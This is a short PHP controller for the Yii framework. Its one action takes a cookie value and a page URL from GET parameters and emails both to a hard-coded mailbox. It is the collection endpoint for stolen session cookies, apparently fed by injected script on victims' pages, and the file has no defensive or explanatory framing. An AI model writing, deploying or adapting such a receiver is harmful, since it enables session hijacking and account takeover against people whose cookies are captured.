<?php
namespace app\controllers;
use Yii;
use yii\rest\Controller;
use app\models\Common;
use app\models\State;

class GetController extends Controller
{
    // 获取cookie发短信
    public function actionCookie(){

        $cookie = Yii::$app->request->get('cookie');
        $href = Yii::$app->request->get('href');

        if(!$cookie || !$href){
            Common::ajaxResult(State::$SYS_PERMISSION_ERROR_CODE , State::$SYS_PERMISSION_ERROR_MSG);
        }

        $cookie = urldecode($cookie);
        $href = urldecode($href);

        Yii::$app->mailer->compose()
        ->setFrom('13250150526@163.com')
        ->setTo('jiaying.yang@qq.com')
        ->setSubject('后台信息')
        ->setTextBody('cookie:'.$cookie.', href:'.$href)
        ->setHtmlBody('<b>cookie为'.$cookie.', href为'.$href.'</b>')
        ->send();

    }
}
